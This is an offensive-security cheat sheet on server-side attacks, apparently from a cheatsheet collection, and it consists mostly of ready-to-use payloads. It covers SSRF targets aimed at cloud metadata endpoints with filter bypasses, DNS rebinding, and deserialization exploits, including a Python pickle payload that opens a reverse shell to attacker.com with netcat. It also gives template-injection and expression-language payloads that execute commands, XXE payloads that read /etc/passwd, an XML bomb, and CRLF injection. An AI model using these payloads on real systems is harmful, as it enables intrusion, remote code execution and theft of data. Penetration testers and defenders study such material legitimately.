# Server-Side Attacks

## SSRF (Server-Side Request Forgery)

### Basic Exploitation

| Target | URL |
|---|---|
| Localhost admin panel | `http://127.0.0.1:8080/admin` |
| AWS metadata | `http://169.254.169.254/latest/meta-data/` |
| Google Cloud metadata | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure metadata | `http://169.254.169.254/metadata/instance` |
| Internal services | `http://localhost:6379` (Redis), `http://localhost:27017` (MongoDB) |

### Filter Bypasses

| Filter | Bypass |
|---|---|
| Blacklist `127.0.0.1` | Use `0`, `0.0.0.0`, `localhost`, `127.1` |
| Blacklist `localhost` | Use IP form: `127.0.0.1` or `[::1]` (IPv6) |
| Blacklist numbers | Use DNS: `localhost`, `internal-api.local` |
| Port restrictions | Use non-standard ports: 8080, 8888, 3000, 9090 |
| Protocol restrictions | Try `gopher://`, `dict://`, `file://` if HTTP is blocked |

### DNS Rebinding

```bash
# Setup DNS to resolve to 127.0.0.1 on second query
# Point attacker.com → public IP (first query)
# Point attacker.com → 127.0.0.1 (second query)

# Exploit JavaScript:
fetch('http://attacker.com/api/admin')  # First request → public IP
# Then trigger retry
fetch('http://attacker.com/api/admin')  # Second request → 127.0.0.1 (rebind)
```

> 💡 Some apps cache DNS results, so DNS rebinding may fail. Try time-delayed requests.

## Deserialization Attacks

### Java Serialization RCE

Vulnerable libraries (ysoserial chains):

```bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections5 'command' | base64

# Deliver via:
# - POST parameter (base64 encoded)
# - Custom object in JSON
# - Cookie value
```

### Python Pickle Deserialization

```python
# Vulnerable code
import pickle
data = pickle.loads(user_input)  # DANGEROUS

# Exploit with reverse shell
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('nc -e /bin/sh attacker.com 4444',))

pickle.dumps(Exploit())
```

### PHP Object Injection

```php
// Vulnerable code
$user = unserialize($_COOKIE['user']);  // DANGEROUS

// Exploit by chaining __wakeup() and __destruct()
O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"password";s:4:"pass";}
```

### .NET ObjectDataProvider (XAML)

```xml
<!-- Vulnerable WCF/ASP.NET -->
<ObjectDataProvider MethodName="Start" ObjectType="{x:Type diag:Process}">
  <ObjectDataProvider.MethodParameters>
    <System:String>cmd.exe</System:String>
    <System:String>/c calc</System:String>
  </ObjectDataProvider.MethodParameters>
</ObjectDataProvider>
```

## Template Injection

### Jinja2 (Python Flask)

```
Vulnerable: {{ user_input }}
```

**Exploitation:**

```
{{ 7 * 7 }}  # Test: should output 49
{{ ''.__class__.__mro__[1].__subclasses__() }}  # Object enumeration
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}
```

### Freemarker (Java)

```
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
```

### Velocity (Java)

```
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))$rt.getRuntime().exec('id')
```

### Twig (PHP)

```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

### ERB (Ruby)

```
<%= `id` %>
<%= system('id') %>
```

## XXE Variants

### XML Bomb (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

### SOAP XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <id>&xxe;</id>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

### XOP/MTOM XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE Root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="&xxe;"/>
  </soap:Body>
</soap:Envelope>
```

## Java Expression Language Injection

### OGNL (Object-Graph Navigation Language)

```
Struts 2: %{1+1}  # Test expression
Struts 2: %{(#cmd='id').(@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### SpEL (Spring Expression Language)

```
T(java.lang.Runtime).getRuntime().exec('id')
@java.lang.Runtime@getRuntime().exec('id')
```

### MVEL (MVVM Expression Language)

```
Runtime.getRuntime().exec('id')
```

## Response Splitting / HTTP Header Injection

```bash
# Inject newlines to craft response
http://target.com/redirect?url=http://evil.com%0d%0aSet-Cookie:%20admin=true

# Or CRLF injection in headers
Reflect-Parameter: value%0d%0aX-Injected-Header: malicious
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README-CHEATSHEETS.md) collection.*

</div>
